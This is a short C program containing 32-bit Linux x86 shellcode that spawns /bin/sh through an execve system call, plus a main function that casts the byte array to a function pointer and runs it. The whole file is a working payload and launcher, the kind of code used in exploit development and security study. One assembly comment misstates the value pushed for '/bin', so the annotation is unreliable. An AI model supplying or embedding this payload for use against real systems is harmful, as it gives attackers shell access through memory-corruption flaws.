#include <stdio.h>
#include <string.h>

unsigned char code[] = \
    "\x31\xc0"            // xor    eax, eax
    "\x50"                // push   eax
    "\x68\x2f\x2f\x73\x68"  // push   0x68732f2f   ; "//sh"
    "\x68\x2f\x62\x69\x6e"  // push   0x69622f2f   ; "/bin"
    "\x89\xe3"            // mov    ebx, esp
    "\x50"                // push   eax
    "\x53"                // push   ebx
    "\x89\xe1"            // mov    ecx, esp
    "\x99"                // cltd
    "\xb0\x0b"            // mov    al, 0xb
    "\xcd\x80";           // int    0x80

int main() {
    printf("Shellcode length: %zu\n", strlen(code));  // Use %zu for size_t

    // Jump to the shellcode
    void (*ret)() = (void(*)())code;
    ret();
}
